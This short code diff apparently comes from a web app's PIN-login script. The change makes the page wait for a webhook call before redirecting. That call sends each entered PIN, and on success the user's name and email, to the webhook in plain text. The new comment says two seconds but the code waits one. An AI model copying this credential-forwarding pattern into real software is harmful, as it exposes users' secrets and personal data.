@@ -29,12 +29,16 @@ function ValidatePin(){
             console.log(data)
             if (data.valid){
                 SendHook("[🔓] Pin Authenticated", `Pin: ${pin} \nUser: ${data.user} \nEmail: ${data.email}`)
-                // redirect to navigation.html
-                window.location.href = "navigation.html";
+                
+                // [DELAY : 2 Seconds] :: Wait for webhook to send before redirect.
+                window.setTimeout(function(){
+                    window.location.href = "navigation.html";
+                }, 1000);
+                
             }
             else{
                 SendHook("[❌] Pin Authentication Failed", `Pin: ${pin}`)
-                alert("Invalid Pin!")
+                Alert("Invalid Pin!")
                 ClearPin()
             }
         })
